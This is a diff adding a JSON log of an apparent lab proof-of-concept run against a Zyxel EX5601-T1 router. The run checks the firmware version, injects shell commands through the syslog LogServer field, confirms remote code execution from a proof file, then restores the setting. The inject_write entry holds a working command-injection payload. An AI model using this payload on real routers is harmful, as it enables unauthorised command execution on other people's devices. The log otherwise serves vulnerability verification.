@@ -1,0 +1,27 @@
+{"ts": "2026-09-12T20:22:09+00:00", "event": "login", "ok": true, "user": "admin", "sessionkey_present": true}
+{"ts": "2026-09-12T20:22:09+00:00", "event": "discover_firmware_oid", "oid": "DeviceInfo", "ok": true, "raw": "{'Object': [{'DeviceInfo': {'DeviceModel': 'EX5601-T1', 'Prod_Model': 'EX5601-T1', 'ZYXEL_FW_Ver': '5.70(ACDZ.6)C0', 'FirmwareVersion': '5.70(ACDZ.6)C0', 'SysVersion': '5.70(ACDZ.6)C0'}}]}"}
+{"ts": "2026-09-12T20:22:09+00:00", "event": "discover_firmware_oid", "oid": "deviceInfo", "ok": true, "raw": "{'Object': [{'DeviceInfo': {'DeviceModel': 'EX5601-T1', 'Prod_Model': 'EX5601-T1', 'ZYXEL_FW_Ver': '5.70(ACDZ.6)C0', 'FirmwareVersion': '5.70(ACDZ.6)C0', 'SysVersion': '5.70(ACDZ.6)C0'}}]}"}
+{"ts": "2026-09-12T20:22:09+00:00", "event": "discover_firmware_oid", "oid": "deviceinfo", "ok": true, "raw": "{'Object': [{'DeviceInfo': {'DeviceModel': 'EX5601-T1', 'Prod_Model': 'EX5601-T1', 'ZYXEL_FW_Ver': '5.70(ACDZ.6)C0', 'FirmwareVersion': '5.70(ACDZ.6)C0', 'SysVersion': '5.70(ACDZ.6)C0'}}]}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "discover_firmware_oid", "oid": "device_info", "ok": true, "raw": "{'Object': [{'DeviceInfo': {'DeviceModel': 'EX5601-T1', 'Prod_Model': 'EX5601-T1', 'ZYXEL_FW_Ver': '5.70(ACDZ.6)C0', 'FirmwareVersion': '5.70(ACDZ.6)C0', 'SysVersion': '5.70(ACDZ.6)C0'}}]}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "firmware_verdict", "model": "EX5601-T1", "found_version": "5.70(ACDZ.6)C0", "verdict": "found '5.70(ACDZ.6)C0' -- looks VULNERABLE (advisory affected <= '5.70(ACDZ.6)C0'); verify manually"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "discover_syslog_oid", "oid": "syslog", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "syslog", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "syslog", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "discover_syslog_oid", "oid": "Syslog", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "Syslog", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "Syslog", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "discover_syslog_oid", "oid": "logserver", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "logserver", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "logserver", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "discover_syslog_oid", "oid": "logServer", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "logServer", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "logServer", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "discover_syslog_oid", "oid": "syslogSetting", "ok": true, "raw": "{'Object': [{'syslog': {'LogServer': '', 'LogServerPort': 514, 'LogEnable': False}}]}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "syslogSetting", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "logserver_field_found", "oid": "syslogSetting", "field": "LogServerPort", "value": "514"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "baseline", "oid": "syslog", "field": "LogServer", "value": ""}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "inject_write", "oid": "syslog", "token": "68e4188e", "proof": "/tmp/zyxel6952_lab/proof_68e4188e.txt", "ok": true, "payload": "127.0.0.1\"; id > /tmp/zyxel6952_lab/proof_68e4188e.txt; uname -a >> /tmp/zyxel6952_lab/proof_68e4188e.txt; hostname >> /tmp/zyxel6952_lab/proof_68e4188e.txt; #", "response": "{'result': 'ZCFG_SUCCESS', 'oid': 'syslog'}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "verify_proof", "token": "68e4188e", "proof": "/tmp/zyxel6952_lab/proof_68e4188e.txt", "content": "uid=<redacted> gid=<redacted> groups=<redacted>\nuname -a: <redacted>\n<hostname>\n"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "rce_confirmed", "token": "68e4188e", "check": "id+uname+hostname"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "inject_restore", "oid": "syslog", "ok": true, "response": "{'result': 'ZCFG_SUCCESS', 'oid': 'syslog'}"}
+{"ts": "2026-09-12T20:22:10+00:00", "event": "post_restore_state", "state": {"logserver": "", "logserver_port": 514, "log_enable": false}}
